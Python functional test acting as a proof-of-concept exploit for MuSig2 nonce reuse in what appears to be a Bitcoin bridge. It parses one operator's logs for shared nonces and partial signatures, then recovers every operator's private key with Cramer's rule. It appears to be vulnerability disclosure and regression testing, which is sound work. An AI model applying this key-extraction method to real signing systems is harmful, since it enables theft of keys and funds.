"""
PoC: MuSig2 Nonce Reuse Key Extraction Attack

This test demonstrates that an attacker observing P2P messages from ONE operator's
log can extract the private keys of ALL operators or nay operator can extract keys
of all other operators.

Attack flow:
1. Start 4 bridge operators (need 4 to get 3 watchtowers for Cramer's rule)
2. Trigger a deposit to cause graph signing
3. Parse ONE operator's log to capture nonces/partials from ALL operators
4. Extract private keys of ALL operators using Cramer's rule
5. Verify extraction by comparing with known keys from artifacts/keys.json

Key math:
- MuSig2 partial signature: s = k1 + b*k2 + e*a*x (3 unknowns: k1, k2, x)
- Need 3 equations (3 signatures with same nonce) to solve via Cramer's rule
- n_watchtowers = n_operators - 1, so 4 operators = 3 watchtowers = 3 contest paths
"""

import time
from contextlib import suppress

import flexitest

from envs import BridgeNetworkEnv
from envs.base_env import BaseEnv
from envs.base_test import StrataTestBase
from factory.bridge_operator.params_cfg import BridgeProtocolParams
from rpc.types import RpcDepositStatusComplete
from utils.deposit import wait_until_deposit_status, wait_until_drt_recognized
from utils.dev_cli import DevCli
from utils.nonce_reuse_attack import (
    CONTEST_INDICES,
    GAME_SINGLE_LEN,
    GAME_WATCHTOWER_LEN,
    SECP256K1_N,
    OperatorSigningData,
    extract_scaled_key_cramer,
    mod_inverse,
    parse_signing_data_from_single_log,
    secret_scalar_to_xonly_pubkey,
    select_best_graph_signing_data,
)
from utils.utils import read_operator_key

# Number of operators needed for key extraction attack
# n_watchtowers = n_operators - 1, so 4 operators = 3 watchtowers
# 3 watchtowers = 3 contest paths with identical nonces = 3 equations for Cramer's rule
NUM_ATTACK_OPERATORS = 4
# With 4 operators we have 3 watchtowers; stake must be divisible by 3 to avoid
# slash transaction construction rounding in debug assertions.
ATTACK_STAKE_AMOUNT = 99_999_999
def reset_rpc_connection(brpc):
    """Reset the HTTP connection to recover from 'Request-sent' state."""
    with suppress(Exception):
        brpc.proxy._AuthServiceProxy__conn.close()


def rpc_call_with_retry(brpc, method, *args, max_retries=3):
    """Execute an RPC call with retry and connection reset on failure."""
    for attempt in range(max_retries):
        try:
            return getattr(brpc.proxy, method)(*args)
        except Exception:
            if attempt == max_retries - 1:
                raise
            # Reset connection and retry
            reset_rpc_connection(brpc)
            time.sleep(0.5)


class NonceReuseAttackEnv(BridgeNetworkEnv):
    """
    Custom environment with 4 operators for nonce reuse attack PoC.

    4 operators gives us 3 watchtowers, which provides 3 contest transaction paths
    that share the same Musig2Params (and thus the same cached nonce).
    This allows key extraction via Cramer's rule.
    """

    def __init__(self):
        # Call grandparent's __init__ directly to set num_operators=4
        BaseEnv.__init__(
            self,
            NUM_ATTACK_OPERATORS,
            bridge_protocol_params=BridgeProtocolParams(stake_amount=ATTACK_STAKE_AMOUNT),
        )

    def fund_operator(self, brpc, bridge_operator_props, wallet_addr):
        """Fund an operator's wallets with retry logic for connection issues."""
        sc_wallet_address = bridge_operator_props["sc_wallet_address"]
        general_wallet_address = bridge_operator_props["general_wallet_address"]

        rpc_call_with_retry(brpc, "sendtoaddress", sc_wallet_address, self.funding_amount)
        rpc_call_with_retry(brpc, "sendtoaddress", general_wallet_address, self.funding_amount)

        # Generate blocks for finalization
        rpc_call_with_retry(brpc, "generatetoaddress", self.finalization_blocks, wallet_addr)


@flexitest.register
class NonceReuseAttackTest(StrataTestBase):
    """
    Demonstrates MuSig2 nonce reuse vulnerability by extracting ALL operator
    private keys from a SINGLE operator's log.

    Attack scenario:
    1. Attacker joins P2P network as an operator (or passive observer)
    2. Attacker captures nonces and partials from all operators via gossipsub
    3. Attacker identifies nonce reuse in contest transaction paths (3 with 4 operators)
    4. Attacker extracts private keys of ALL operators using Cramer's rule

    Why 4 operators:
    - n_watchtowers = n_operators - 1
    - 4 operators = 3 watchtowers = 3 contest paths with same nonce
    - MuSig2 partial: s = k1 + b*k2 + e*a*x (3 unknowns)
    - 3 equations needed to solve via Cramer's rule
    """

    def __init__(self, ctx: flexitest.InitContext):
        ctx.set_env(NonceReuseAttackEnv())

    def main(self, ctx: flexitest.RunContext):
        self.logger.info("=== MuSig2 Nonce Reuse Attack: Extract ALL Keys ===")

        self.logger.info("Phase 1: Setting up operators...")
        bridge_nodes, bridge_rpcs, expected_keys = self._setup_attack_nodes(ctx)

        self.logger.info("Phase 2: Triggering deposit to cause graph signing...")
        self._trigger_deposit_for_graph_signing(ctx, bridge_rpcs[0], expected_keys)

        time.sleep(5)

        self.logger.info("Phase 3: Parsing attacker's log (operator 0)...")
        attacker_log = bridge_nodes[0].props["logfile"]
        signing_data = self._load_best_graph_signing_data(attacker_log, len(bridge_nodes))

        self.logger.info("Phase 4: Analyzing nonce reuse and extracting keys...")
        extracted_keys = self._extract_keys_for_all_operators(signing_data, expected_keys)

        self._log_attack_summary(extracted_keys)

        num_operators = len(bridge_nodes)
        if len(extracted_keys) != num_operators:
            missing = [i for i in range(num_operators) if i not in extracted_keys]
            raise AssertionError(
                "Failed to extract all operator keys: extracted "
                f"{len(extracted_keys)}/{num_operators}, missing={missing}"
            )

        return True

    def _setup_attack_nodes(
        self,
        ctx: flexitest.RunContext,
    ) -> tuple[list[object], list[object], list[str]]:
        bridge_nodes = [
            ctx.get_service(f"bridge_node_{idx}") for idx in range(NUM_ATTACK_OPERATORS)
        ]
        bridge_rpcs = [bridge_node.create_rpc() for bridge_node in bridge_nodes]
        expected_keys = [read_operator_key(i).MUSIG2_KEY for i in range(len(bridge_nodes))]

        self.logger.info("  Operators: %s", len(bridge_nodes))
        return bridge_nodes, bridge_rpcs, expected_keys

    def _trigger_deposit_for_graph_signing(
        self,
        ctx: flexitest.RunContext,
        bridge_rpc,
        expected_keys: list[str],
    ) -> None:
        bitcoind_service = ctx.get_service("bitcoin")
        bitcoind_props = bitcoind_service.props

        dev_cli = DevCli(bitcoind_props, expected_keys)
        drt_txid = dev_cli.send_deposit_request()
        self.logger.info("  Deposit request: %s", drt_txid)

        deposit_id = wait_until_drt_recognized(bridge_rpc, drt_txid)
        self.logger.info("  Deposit ID: %s", deposit_id)

        wait_until_deposit_status(bridge_rpc, deposit_id, RpcDepositStatusComplete, timeout=300)
        self.logger.info("  Deposit completed (graph signing finished)")

    def _load_best_graph_signing_data(
        self,
        attacker_log: str,
        num_operators: int,
    ) -> dict[int, OperatorSigningData]:
        signing_data_by_graph = parse_signing_data_from_single_log(attacker_log)
        selected = select_best_graph_signing_data(signing_data_by_graph, num_operators)
        if selected is None:
            raise AssertionError(
                "No graph signing data found in attacker log (nonces/partials/coefficients missing)"
            )

        selected_graph_key, signing_data = selected
        selected_deposit_idx, selected_graph_owner = selected_graph_key
        self.logger.info(
            "  Selected graph context: deposit=%s, graph_operator=%s",
            selected_deposit_idx,
            selected_graph_owner,
        )

        self.logger.info("  Captured signing data from %s operators:", len(signing_data))
        for op_idx, data in sorted(signing_data.items()):
            self.logger.info(
                "    Operator %s: %s nonces, %s partials, %s coefficient rows",
                op_idx,
                len(data.nonces),
                len(data.partials),
                len(data.coefficients),
            )

        return signing_data

    def _extract_keys_for_all_operators(
        self,
        signing_data: dict[int, OperatorSigningData],
        expected_keys: list[str],
    ) -> dict[int, str]:
        extracted_keys: dict[int, str] = {}

        for op_idx, expected_pubkey in enumerate(expected_keys):
            data = signing_data.get(op_idx)
            if data is None:
                self.logger.info("  Operator %s: No observed signing data", op_idx)
                continue

            extracted = self._extract_key_for_operator(op_idx, data, expected_pubkey.lower())
            if extracted is not None:
                extracted_keys[op_idx] = extracted

        return extracted_keys

    def _extract_key_for_operator(
        self,
        op_idx: int,
        data: OperatorSigningData,
        expected_pubkey: str,
    ) -> str | None:
        if len(data.nonces) < 2 or len(data.partials) < 2:
            self.logger.info("  Operator %s: Insufficient data for extraction", op_idx)
            return None

        n_watchtowers = (len(data.nonces) - GAME_SINGLE_LEN) // GAME_WATCHTOWER_LEN
        self.logger.info(
            "  Operator %s: %s nonces, %s watchtowers",
            op_idx,
            len(data.nonces),
            n_watchtowers,
        )

        if n_watchtowers < len(CONTEST_INDICES):
            self.logger.info(
                "  Operator %s: Need at least %s watchtowers, got %s",
                op_idx,
                len(CONTEST_INDICES),
                n_watchtowers,
            )
            return None

        extraction_indices = CONTEST_INDICES
        if not all(
            idx < len(data.nonces) and idx < len(data.partials)
            for idx in extraction_indices
        ):
            self.logger.info(
                "  Operator %s: Missing contest nonce/partial rows at indices %s",
                op_idx,
                extraction_indices,
            )
            return None

        if not all(idx in data.coefficients for idx in extraction_indices):
            self.logger.info(
                "  Operator %s: Missing coefficient rows for indices %s",
                op_idx,
                extraction_indices,
            )
            return None

        nonce_0 = data.nonces[extraction_indices[0]]
        nonce_1 = data.nonces[extraction_indices[1]]
        nonce_2 = data.nonces[extraction_indices[2]]

        self.logger.info("    Contest nonce at idx %s: %s...", extraction_indices[0], nonce_0[:32])
        self.logger.info("    Contest nonce at idx %s: %s...", extraction_indices[1], nonce_1[:32])
        self.logger.info("    Contest nonce at idx %s: %s...", extraction_indices[2], nonce_2[:32])

        if not (nonce_0 == nonce_1 == nonce_2):
            self.logger.info(
                "  Operator %s: Contest nonces differ at indices %s",
                op_idx,
                extraction_indices,
            )
            return None

        self.logger.info("    MATCH! All 3 contest nonces are IDENTICAL")
        self.logger.info("    VULNERABILITY CONFIRMED: Can extract key via Cramer's rule!")

        cramer_inputs = self._collect_cramer_inputs(op_idx, data, extraction_indices)
        if cramer_inputs is None:
            return None

        partials, challenges, binding_factors, nonce_factors, key_coeff = cramer_inputs

        scaled_key = extract_scaled_key_cramer(
            partials=partials,
            challenges=challenges,
            binding_factors=binding_factors,
            nonce_factors=nonce_factors,
            n=SECP256K1_N,
        )
        if scaled_key is None:
            self.logger.info("  Operator %s: Singular matrix during extraction", op_idx)
            return None

        extracted_scalar = (scaled_key * mod_inverse(key_coeff, SECP256K1_N)) % SECP256K1_N
        if extracted_scalar == 0:
            self.logger.info("  Operator %s: Extracted zero scalar, invalid", op_idx)
            return None

        extracted_pubkey = secret_scalar_to_xonly_pubkey(extracted_scalar)
        if extracted_pubkey != expected_pubkey:
            self.logger.info(
                "  Operator %s: Extraction mismatch (derived %s, expected %s)",
                op_idx,
                extracted_pubkey,
                expected_pubkey,
            )
            return None

        extracted_key_hex = f"{extracted_scalar:064x}"
        self.logger.info(
            "  Operator %s: KEY EXTRACTED at indices %s -> derived_pubkey=%s expected_pubkey=%s",
            op_idx,
            extraction_indices,
            extracted_pubkey,
            expected_pubkey,
        )
        self.logger.info("  Operator %s: extracted private key = %s", op_idx, extracted_key_hex)
        return extracted_key_hex

    def _collect_cramer_inputs(
        self,
        op_idx: int,
        data: OperatorSigningData,
        extraction_indices: list[int],
    ) -> tuple[list[int], list[int], list[int], list[int], int] | None:
        partials: list[int] = []
        challenges: list[int] = []
        binding_factors: list[int] = []
        nonce_factors: list[int] = []
        key_coeffs: list[int] = []

        for idx in extraction_indices:
            coeff = data.coefficients[idx]
            partials.append(int(data.partials[idx], 16))
            challenges.append(coeff.challenge % SECP256K1_N)
            binding_factors.append(coeff.binding_factor % SECP256K1_N)
            nonce_factors.append(1 if coeff.nonce_parity == 1 else SECP256K1_N - 1)
            key_coeffs.append(coeff.key_coeff % SECP256K1_N)

        if len(set(key_coeffs)) != 1:
            self.logger.info(
                "  Operator %s: Inconsistent key coefficients across indices %s",
                op_idx,
                extraction_indices,
            )
            return None

        key_coeff = key_coeffs[0]
        if key_coeff == 0:
            self.logger.info("  Operator %s: Zero key coefficient, cannot invert", op_idx)
            return None

        return partials, challenges, binding_factors, nonce_factors, key_coeff

    def _log_attack_summary(self, extracted_keys: dict[int, str]) -> None:
        self.logger.info("Phase 5: Attack Summary")
        self.logger.info("=" * 60)

        if extracted_keys:
            self.logger.info("VULNERABILITY CONFIRMED: Private key extraction succeeded!")
            self.logger.info("  Extracted operators: %s", sorted(extracted_keys.keys()))
            for op_idx in sorted(extracted_keys):
                extracted_key = extracted_keys[op_idx]
                extracted_pubkey = secret_scalar_to_xonly_pubkey(int(extracted_key, 16))
                self.logger.info(
                    "    Operator %s: private_key=%s pubkey=%s",
                    op_idx,
                    extracted_key,
                    extracted_pubkey,
                )
            self.logger.info("")
            self.logger.info("  Attack vector:")
            self.logger.info("  - Contest watchtower paths share same Musig2Params")
            self.logger.info("  - Same params = same cached nonce in secret-service")
            self.logger.info("  - Different sighashes = different messages signed")
            self.logger.info("  - 4 operators = 3 watchtowers = 3 contest paths")
            self.logger.info("")
            self.logger.info("  Key extraction via Cramer's rule (3 unknowns, 3 equations):")
            self.logger.info("  - MuSig2 partial: s_i = n_i*k1 + n_i*b_i*k2 + e_i*a*n_d*x")
            self.logger.info("  - Same nonce for all 3 paths means same (k1, k2)")
            self.logger.info(
                "  - Solve 3x3 linear system for scaled secret, then divide by key coeff"
            )
            self.logger.info("")
            self.logger.info("  Reproducible proof is this functional test run output")
        else:
            self.logger.info("  No private keys extracted in this run")
            self.logger.info("")
            self.logger.info("  Expected contest indices: 11, 15, 19 (for 3 watchtowers)")
            self.logger.info("  Check that coefficients were logged for those indices")

        self.logger.info("=" * 60)
        self.logger.info("=== Attack PoC Complete ===")
